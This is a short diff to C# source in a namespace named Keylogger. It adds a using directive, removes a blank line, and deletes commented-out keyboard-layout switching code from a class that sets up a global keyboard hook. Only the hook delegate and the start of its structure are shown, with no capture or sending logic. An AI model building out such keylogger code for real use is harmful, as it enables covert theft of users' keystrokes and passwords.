@@ -11,6 +11,7 @@ using System.Drawing;
 using System.Windows.Interop;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.Globalization;
 using System.Windows.Input;
 
 
@@ -91,7 +92,6 @@ namespace Keylogger
 
     #endregion
 
-   
     #region Keylogger
 
     class globalKeyboardHook
@@ -99,29 +99,7 @@ namespace Keylogger
         #region Constant, Structure and Delegate Definitions
 
         public delegate int keyboardHookProc(int code, int wParam, ref keyboardHookStruct lParam);
-
-        //************************************************************************
-
-        //[DllImport("user32.dll")]
-        //private static extern bool PostMessage(int hhwnd, uint msg, IntPtr wparam, IntPtr lparam);
-
-        //[DllImport("user32.dll")]
-        //private static extern IntPtr LoadKeyboardLayout(string pwszKLID, uint Flags);
-
-        //private static uint WM_INPUTLANGCHANGEREQUEST = 0x0050;
-        //private static int HWND_BROADCAST = 0xffff;
-        //private static string en_US = "00000409";
-        //private static string ru_RU = "00000419";
-        //private static string uk_UA = "00000422";
-        //private static uint KLF_ACTIVATE = 1;
-
-        //private static void ChangeLanguage()
-        //{
-        //    PostMessage(HWND_BROADCAST, WM_INPUTLANGCHANGEREQUEST, IntPtr.Zero, LoadKeyboardLayout(en_US, KLF_ACTIVATE));
-        //}
-
-        //**********************************************************************
-
+        
         public struct keyboardHookStruct
         {
             public int vkCode;
